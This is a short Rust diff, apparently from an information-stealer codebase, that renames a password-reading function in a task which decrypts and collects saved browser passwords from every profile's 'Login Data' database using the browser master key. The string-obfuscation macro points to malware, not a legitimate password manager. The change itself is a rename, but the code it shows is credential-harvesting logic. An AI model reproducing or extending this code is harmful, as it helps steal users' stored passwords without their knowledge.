@@ -32,7 +32,7 @@ impl Task for PasswordsTask {
     unsafe fn run(&self, parent: &Path) {
         let Some(passwords) = collect_from_all_profiles(
             &self.browser.profiles,
-            |profile| get_passwords(profile, &self.browser.master_key)
+            |profile| read_passwords(profile, &self.browser.master_key)
         ) else {
             return
         };
@@ -41,7 +41,7 @@ impl Task for PasswordsTask {
     }
 }
 
-fn get_passwords(profile: &Path, master_key: &[u8]) -> Option<Vec<Password>> {
+fn read_passwords(profile: &Path, master_key: &[u8]) -> Option<Vec<Password>> {
     let login_data = profile / s!("Login Data");
     
     read_sqlite3_and_map_records(
